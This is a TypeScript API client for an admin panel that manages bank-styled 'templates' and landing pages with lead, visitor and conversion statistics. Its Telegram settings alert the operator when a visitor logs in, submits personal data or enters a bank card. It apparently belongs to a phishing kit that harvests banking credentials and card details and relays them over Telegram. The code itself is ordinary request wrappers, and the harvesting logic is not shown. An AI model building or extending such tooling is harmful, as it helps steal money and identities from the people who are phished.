// API utility functions with authentication

const API_BASE_URL = '/api';

/**
 * Get authentication headers with JWT token
 */
export function getAuthHeaders(): HeadersInit {
  const token = localStorage.getItem('token');
  return {
    'Content-Type': 'application/json',
    ...(token && { 'Authorization': `Bearer ${token}` })
  };
}

/**
 * Make an authenticated API request
 */
export async function authenticatedFetch(url: string, options: RequestInit = {}): Promise<Response> {
  const fullUrl = url.startsWith('http') ? url : `${API_BASE_URL}${url}`;
  
  const response = await fetch(fullUrl, {
    ...options,
    headers: {
      ...getAuthHeaders(),
      ...options.headers
    }
  });

  // Handle 401 Unauthorized - throw error but don't redirect
  // Let the calling component handle the error appropriately
  if (response.status === 401) {
    throw new Error('UNAUTHORIZED');
  }

  return response;
}

/**
 * Template API functions
 */
export const templateAPI = {
  // Get all templates with statistics (with optional type filtering)
  async getTemplatesWithStats(templateType?: 'bank' | 'landing_page') {
    const url = templateType 
      ? `${API_BASE_URL}/templates?type=${templateType}`
      : `${API_BASE_URL}/templates`;
    
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error('Failed to fetch templates');
    }
    const data = await response.json();
    
          // Fetch statistics for each template with authentication
      const templatesWithStats = await Promise.all(
        data.templates.map(async (template: any) => {
          try {
            const statsResponse = await authenticatedFetch(`/templates/${template.id}/statistics`);
            if (statsResponse.ok) {
              const statsData = await statsResponse.json();
              return {
                ...template,
                leads: statsData.statistics.leads || 0,
                visitors: statsData.statistics.visitors || 0,
                conversionRate: statsData.statistics.conversionRate || 0
              };
            }
          } catch (error) {
            console.error(`Failed to fetch stats for template ${template.id}:`, error);
          }
          
          return {
            ...template,
            leads: 0,
            visitors: 0,
            conversionRate: 0
          };
        })
      );
    
    return templatesWithStats;
  },

  // Toggle template status
  async toggleStatus(templateId: number) {
    const response = await authenticatedFetch(`/templates/${templateId}/toggle-status`, {
      method: 'POST'
    });
    
    if (!response.ok) {
      throw new Error('Failed to toggle template status');
    }
    
    return response.json();
  },

  // Update template
  async updateTemplate(id: number, updates: any) {
    const response = await authenticatedFetch(`/templates/${id}`, {
      method: 'PUT',
      body: JSON.stringify(updates)
    });
    
    if (!response.ok) {
      throw new Error('Failed to update template');
    }
    
    return response.json();
  },

  // Get step configuration for a template
  async getStepConfig(templateId: number) {
    const response = await authenticatedFetch(`/templates/${templateId}/step-config`);
    
    if (!response.ok) {
      throw new Error('Failed to fetch step configuration');
    }
    
    return response.json();
  },

  // Update single step configuration
  async updateStepConfig(templateId: number, stepName: string, isEnabled: boolean) {
    const response = await authenticatedFetch(`/templates/${templateId}/step-config`, {
      method: 'PUT',
      body: JSON.stringify({ stepName, isEnabled })
    });
    
    if (!response.ok) {
      throw new Error('Failed to update step configuration');
    }
    
    return response.json();
  },

  // Bulk update step configuration
  async bulkUpdateStepConfig(templateId: number, stepConfig: Record<string, boolean>) {
    const response = await authenticatedFetch(`/templates/${templateId}/step-config/bulk`, {
      method: 'PUT',
      body: JSON.stringify({ stepConfig })
    });
    
    if (!response.ok) {
      throw new Error('Failed to bulk update step configuration');
    }
    
    return response.json();
  },

  // Reset step configuration to defaults
  async resetStepConfig(templateId: number) {
    const response = await authenticatedFetch(`/templates/${templateId}/reset-config`, {
      method: 'POST'
    });
    
    if (!response.ok) {
      throw new Error('Failed to reset step configuration');
    }
    
    return response.json();
  },

  // Get runtime configuration for frontend (public)
  async getRuntimeConfig(templateName: string) {
    const response = await fetch(`${API_BASE_URL}/templates/config/${templateName}`);
    
    if (!response.ok) {
      throw new Error('Failed to fetch runtime configuration');
    }
    
    return response.json();
  }
};

/**
 * Auth API functions
 */
export const authAPI = {
  // Change password
  async changePassword(currentPassword: string, newPassword: string) {
    const response = await authenticatedFetch('/auth/change-password', {
      method: 'POST',
      body: JSON.stringify({ currentPassword, newPassword })
    });
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || 'Failed to change password');
    }
    
    return response.json();
  },

  // Get current user info
  async getCurrentUser() {
    const response = await authenticatedFetch('/auth/me');
    
    if (!response.ok) {
      throw new Error('Failed to get current user');
    }
    
    return response.json();
  }
};

/**
 * Telegram API functions
 */
export const telegramAPI = {
  // Get Telegram settings
  async getSettings() {
    const response = await authenticatedFetch('/telegram/settings');
    
    if (!response.ok) {
      throw new Error('Failed to fetch Telegram settings');
    }
    
    return response.json();
  },

  // Update Telegram settings
  async updateSettings(settings: {
    bot_token?: string;
    chat_id?: string;
    admin_chat_id?: string;
    notifications_enabled?: boolean;
    notify_on_login?: boolean;
    notify_on_personal_data?: boolean;
    notify_on_bank_card?: boolean;
    notify_on_completion?: boolean;
    message_template?: string;
  }) {
    const response = await authenticatedFetch('/telegram/settings', {
      method: 'PUT',
      body: JSON.stringify(settings)
    });
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || 'Failed to update Telegram settings');
    }
    
    return response.json();
  },

  // Send test notification
  async sendTestNotification(chatId: string) {
    const response = await authenticatedFetch('/telegram/test', {
      method: 'POST',
      body: JSON.stringify({ chat_id: chatId })
    });
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || 'Failed to send test notification');
    }
    
    return response.json();
  },

  // Get bot status
  async getBotStatus() {
    const response = await authenticatedFetch('/telegram/status');
    
    if (!response.ok) {
      throw new Error('Failed to get bot status');
    }
    
    return response.json();
  },

  // Resend notification for lead
  async resendNotification(leadId: number) {
    const response = await authenticatedFetch(`/telegram/resend/${leadId}`, {
      method: 'POST'
    });
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || 'Failed to resend notification');
    }
    
    return response.json();
  },

  // Get bot information
  async getBotInfo(botToken: string) {
    const response = await authenticatedFetch('/telegram/bot-info', {
      method: 'POST',
      body: JSON.stringify({ bot_token: botToken })
    });
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || 'Failed to get bot info');
    }
    
    return response.json();
  },

  // Discover chat IDs
  async discoverChats(botToken: string) {
    const response = await authenticatedFetch('/telegram/discover-chats', {
      method: 'POST',
      body: JSON.stringify({ bot_token: botToken })
    });
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || 'Failed to discover chats');
    }
    
    return response.json();
  }
};